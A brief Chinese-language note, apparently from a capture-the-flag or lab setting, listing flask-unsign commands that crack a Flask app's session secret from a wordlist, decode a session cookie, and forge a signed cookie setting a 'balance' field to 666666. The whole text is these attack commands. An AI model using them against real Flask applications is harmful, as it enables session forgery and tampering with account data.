需要得到 secret, 
```sh
pip install flask-unsign
flask-unsign --sign --cookie "{'balance': 666666}" --secret "XMM<XMK"

flask-unsign --unsign --cookie "eyJ1c2VyIjoiaWRkbm0ifQ.YyVDmQ.nXit643ch5T34u092IJSngKbCwI" --wordlist dict.txt
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8"
```